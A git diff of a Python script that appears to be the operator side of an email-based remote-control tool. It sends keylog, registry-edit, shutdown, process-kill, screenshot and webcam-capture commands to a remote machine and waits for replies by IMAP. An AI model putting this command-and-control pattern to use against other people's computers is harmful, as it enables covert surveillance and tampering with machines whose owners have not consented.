@@ -1,25 +1,15 @@
-import smtplib
-import imaplib
 import smtp
 import imap
 import time
 import threading
 import random
+import utils
 
 SERVER_MAIL = 'email@gmail.com'
-
-
+DATA_FOLDER = 'data'
 
 if __name__ == '__main__':
-    # handler = imap.MailFetcher()
-    # try:
-    #     while True:
-    #         print('Idling...\t Press Ctrl + C to escape')
-    #         user_mail, cmd = handler.fetch_newest()
-
-    # except KeyboardInterrupt:
-    #     print('Ctrl C pressed')
-    try: 
+    try:
         mail_sender = smtp.MailSender()
         mail_receiver = imap.MailReceiver()
 
@@ -27,22 +17,75 @@ if __name__ == '__main__':
             inp = input()
             # inp = 'keylog'
             if inp == 'keylog':
-                id = str(random.randint(10000,99999))
+                id = str(random.randint(10000, 99999))
                 cmd = 'keylog ' + id
                 mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
-                threading.Thread(target = imap.await_response, daemon=True, args=(mail_receiver, SERVER_MAIL, cmd, 60,)).start()
+                threading.Thread(target=imap.await_response, daemon=True, args=(
+                    mail_receiver, SERVER_MAIL, cmd, 60,)).start()
 
             # inp = 'regedit HKEY_CURRENT_USER|Software\\SampleKey<>binvalue<>1234'
             elif inp.startswith('regedit'):
-                print('regediting')
                 id = str(random.randint(10000, 99999))
                 insert_idx = inp.find('HKEY')
                 if insert_idx >= 0:
+                    cmd = inp[:insert_idx] + id + ' ' + inp[insert_idx:]
+                    mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
+                    threading.Thread(target=imap.await_response, daemon=True, args=(
+                        mail_receiver, SERVER_MAIL, cmd, 30,)).start()
                     pass
+            # inp = 'shutdown' or 'shutdown --10'
+            elif inp.startswith('shutdown'):
+                id = str(random.randint(10000, 99999))
+                cmd = inp[:8] + ' ' + id + inp[8:]
+                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
+                threading.Thread(target=imap.await_response, daemon=True, args=(
+                    mail_receiver, SERVER_MAIL, cmd, 30,)).start()
 
+            elif inp.startswith('restart'):
+                id = str(random.randint(10000, 99999))
+                cmd = inp[:7] + ' ' + id + inp[7:]
+                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
+                threading.Thread(target=imap.await_response, daemon=True, args=(
+                    mail_receiver, SERVER_MAIL, cmd, 30,)).start()
 
+            elif inp.startswith('hibernate'):
+                id = str(random.randint(10000, 99999))
+                cmd = inp[:9] + ' ' + id + inp[9:]
+                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
+                threading.Thread(target=imap.await_response, daemon=True, args=(
+                    mail_receiver, SERVER_MAIL, cmd, 30,)).start()
 
+            elif inp.startswith('list'):
+                id = str(random.randint(10000, 99999))
+                cmd = inp[:4] + ' ' + id + inp[4:]
+                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
+                threading.Thread(target=imap.await_response, daemon=True, args=(
+                    mail_receiver, SERVER_MAIL, cmd, 30,)).start()
+
+            elif inp.startswith('kill') and len(inp) > 4:
+                id = str(random.randint(10000, 99999))
+                cmd = inp[:4] + ' ' + id + inp[4:]
+                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
+                threading.Thread(target=imap.await_response, daemon=True, args=(
+                    mail_receiver, SERVER_MAIL, cmd, 30,)).start()
+
+            elif inp == 'screenshot':
+                id = str(random.randint(10000, 99999))
+                cmd = inp + ' ' + id
+                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
+                threading.Thread(target=imap.await_response, daemon=True, args=(
+                    mail_receiver, SERVER_MAIL, cmd, 30,)).start()
+
+            elif inp == 'webcamshot':
+                id = str(random.randint(10000, 99999))
+                cmd = inp + ' ' + id
+                mail_sender.send_attached_email(SERVER_MAIL, cmd, "")
+                threading.Thread(target=imap.await_response, daemon=True, args=(
+                    mail_receiver, SERVER_MAIL, cmd, 30,)).start()
 
     except KeyboardInterrupt:
+        print('Ctrl C pressed')
+        utils.remove_files('data', ends_with='.jpg')
+        utils.remove_files('data', ends_with='.txt')
         pass
     pass
